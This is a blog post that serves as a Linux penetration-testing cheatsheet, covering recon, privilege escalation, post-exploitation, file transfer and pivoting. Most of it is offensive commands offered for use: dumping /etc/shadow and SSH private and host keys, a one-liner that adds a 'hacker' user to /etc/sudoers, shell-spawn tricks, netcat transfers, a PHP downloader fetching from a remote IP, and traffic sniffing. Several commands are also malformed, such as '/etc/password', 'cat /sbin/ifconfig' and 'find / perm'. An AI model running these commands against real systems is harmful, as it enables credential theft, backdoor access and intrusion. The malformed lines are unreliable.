---
layout: post
title:  "Linux Command Reference For Pentest"
date:   2021-10-01 21:03:36 +0530
categories: Linux PrivEsc Exploit Cheatsheet
description: This note is as my guideline when working using linux for penetration, but i really hate linux.
thumbnail: https://www.kali.org/images/kali-dragon-icon.svg
---




<!-- TOC -->
# Table of Contents:
   - <a href="#enumeration">Enumeration</a>
      - <a href="#-basics">Basics</a>
      - <a href="#-recon">Recon</a>
      - <a href="#-udp-scan">UDP Scan</a>
      - <a href="#-ftp-enum">FTP Enum</a>
   - <a href="#exploitation">Expoitation</a>
   - <a href="#privilege-escalation">PRIVILEGE ESCALATION</a>
	  - <a href="#-basics">Basics</a>
	  - <a href="#-run-pspy64">Run pspy64</a>
	  - <a href="#-spawn-tty">Spawn TTY</a>
	  - <a href="#-enum-scripts">Enum Scripts</a>
	  - <a href="#-add-user-to-sudoers">Add User to Sudoers</a>
	  - <a href="#-list-cronjobs">List CronJobs</a>
	  - <a href="#-check-for-ssh-readable-ssh-keys-for-persistence-and-elevation">Check for SSH Readable SSH Keys for Persistence and Elevation</a>
	  - <a href="#-startup-scripts">Startup Scripts</a>
	  - <a href="#-find-writable-files-for-users-or-groups">Find Writable Files for Users or Groups</a>
	  - <a href="#-find-writable-directories-for-users-or-groups">Find Writable Directories for Users or Groups</a>
	  - <a href="#-find-world-writable-directories">Find World Writable Directories</a>
	  - <a href="#-find-world-writable-directories-for-root">Find World Writable Directories for Root</a>
	  - <a href="#-find-world-writable-files">Find World Writable Files</a>
	  - <a href="#-find-world-writable-files-in-etc">Find World Writable files in /etc</a>
	  - <a href="#-sniff-traffic">Sniff Traffic</a>
	  - <a href="#-user-installed-software-sometimes-misconfigured">User Installed Software (Sometimes Misconfigured)</a>
   - <a href="#post-exploitation">POST EXPLOITATION</a>
      - <a href="#-get-capabilities">Get Capabilities</a>
	  - <a href="#-get-suid-binaries">Get SUID Binaries</a>
	  - <a href="#-check-sudo-config">Check Sudo Config</a>
   - <a href="#file-transfers">FILE TRANSFERS</a>
      - <a href="#-base64">Base64</a>
	  - <a href="#-curl">Curl</a>
	  - <a href="#-wget">wget</a>
	  - <a href="#-ftp">FTP</a>
	  - <a href="#-tftp">TFTP</a>
	  - <a href="#-nc-listeners">NC Listeners</a>
	  - <a href="#-php-file-transfers">PHP File Transfers</a>
	  - <a href="#-scp">SCP</a>
   - <a href="#pivoting-or-leteral-movement">PIVOTING OR LETERAL MOVEMENT</a>
	  - <a href="#-ssh-local-port-forward">SSH Local Port Forward</a>
	  - <a href="#-ssh-dynamic-port-forward">SSH Dynamic Port Forward</a>
	  - <a href="#-socat-port-forward">Socat Port Forward</a>
	  - <a href="#-searching">Searching</a>
<!-- /TOC -->

## [](#header-2)ENUMERATION

#### [](#header-4) Basics
```powershell
whoami
hostname 
uname -a
cat /etc/password
cat /etc/shadow
groups
ifconfig
netstat -an
ps aux | grep root
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts
```

#### [](#header-4) Recon
Always start with a stealthy scan to avoid closing ports.
```powershell
# Syn-scan
nmap -sS [InsertIpAdress]
```
```powershell

# Scan all TCP Ports
nmap [InsertIpAdress] -p-
```
```powershell

# Service-version, default scripts, OS:
nmap [InsertIpAdress] -sV -sC -O -p 111,222,333
```
```powershell

# Scan for UDP
nmap [InsertIpAdress] -sU
```
```powershell

# Connect to udp if one is open
nc -u [InsertIpAdress] 48772
```

#### [](#header-4) UDP Scan
```powershell
./udpprotocolscanner [ Ip ]
```

#### [](#header-4) FTP Enum
```powershell
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [InsertIpAdress]
```

Start Web Server
```powershell
python -m SimpleHTTPServer 80
```
## [](#header-2)EXPLOITATION

lib SSH Authentication Bypass - CVE-2018-10933

```powershell
nc [InsertIpAdress] 22 to banner grab the SSH Service, if it's running vulnerable version of libSSH then
```
Reference : <https://github.com/blacknbunny/libSSH-Authentication-Bypass>

## [](#header-2)PRIVILEGE ESCALATION

#### [](#header-4) Basics
```powershell
cat /proc/version <- Check for kernel exploits
ps auxww
ps -ef
lsof -i
netstat -laputen
arp -e
route
cat /sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
cat /etc/issue
cat /etc/*-release
cat /proc/version
uname -a
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
lsb_release -a
```

#### [](#header-4) Run pspy64

@:: <https://github.com/DominicBreuker/pspy>

Run in background and watch for any processes running

#### [](#header-4) Spawn TTY

@:: <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>

```powershell
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
awk 'BEGIN {system("/bin/sh")}'
find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb(main:001:0> exec "/bin/sh"
Can also use socat
```

#### [](#header-4) Enum Scripts
```powershell
cd /EscalationServer/
chmod u+x linux_enum.sh
chmod 700 linuxenum.py
```
```powershell
./linux_enum.sh
python linuxenum.py
```

#### [](#header-4) Add User to Sudoers
```powershell
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

#### [](#header-4) List CronJobs
```powershell
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### [](#header-4) Check for SSH Readable SSH Keys for Persistence and Elevation
```powershell
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

#### [](#header-4) Startup Scripts
```powershell
find / -perm -o+w -type f 2>/dev/null | grep -v '/proc\|/dev'
```

#### [](#header-4) Find Writable Files for Users or Groups
```powershell
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul
```

#### [](#header-4) Find Writable Directories for Users or Groups
```powershell
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```

#### [](#header-4) Find World Writable Directories
```powershell
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';'
2>/dev/null | grep -v root

find / -writable -type d 2>/dev/null
```

#### [](#header-4) Find World Writable Directories for Root
```powershell
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';'
2>/dev/null | grep root
```

#### [](#header-4) Find World Writable Files
```powershell
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm
-0002 \) -exec ls -l '{}' ';' 2>/dev/null
```

#### [](#header-4) Find World Writable files in /etc
```powershell
find /etc -perm -2 -type f 2>/dev/null
```

#### [](#header-4) Sniff Traffic
```powershell
tcpdump -i eth0 [Protocol]
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
```

#### [](#header-4) User Installed Software (Sometimes Misconfigured)
```powershell
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/
```

## [](#header-2)POST EXPLOITATION

#### [](#header-4) Get Capabilities
```powershell
/sbin/getcap -r / 2>/dev/null
```

#### [](#header-4) Get SUID Binaries
```powershell
find / -perm -u=s -type f 2>/dev/null
```

#### [](#header-4) Check Sudo Config
```powershell
sudo -l
```

## [](#header-2)FILE TRANSFERS

#### [](#header-4) Base64
```powershell
cat file.transfer | base64 -w 0 
echo base64blob | base64 -d > file.transfer
```
#### [](#header-4) Curl
```powershell
curl http://webserver/file.txt > output.txt
```
#### [](#header-4) wget
```powershell
wget http://webserver/file.txt > output.txt
```
#### [](#header-4) FTP
```powershell
pip install pyftpdlib
python -m pyftpdlib -p 21 -w
```
#### [](#header-4) TFTP
```powershell
service atftpd start
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
auxiliary/server/tftp
```
#### [](#header-4) NC Listeners
```powershell
nc -lvnp 443 < filetotransfer.txt
nc [Ip] 443 > filetransfer.txt 
```
#### [](#header-4) PHP File Transfers
```powershell
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
#### [](#header-4) SCP
```powershell

# Copy a file:
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
```
```powershell

# Copy a directory:
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
```

## [](#header-2)PIVOTING OR LETERAL MOVEMENT

#### [](#header-4) SSH Local Port Forward
```powershell
ssh [User]@[Target] -L 127.0.0.1:8888:[TargetIp]:[TargetPort]
```
#### [](#header-4) SSH Dynamic Port Forward
```powershell
ssh -D [LocalPort] user@host
nano /etc/proxychains.conf
127.0.0.1 [LocalPort]
```
#### [](#header-4) Socat Port Forward
```powershell
./socat tcp-listen:5000,reuseaddr,fork tcp:[TargetIp]:5001
```
#### [](#header-4) Searching
```powershell
grep pattern [FileName]
grep -r pattern [Directori]
locate [FileName]
```
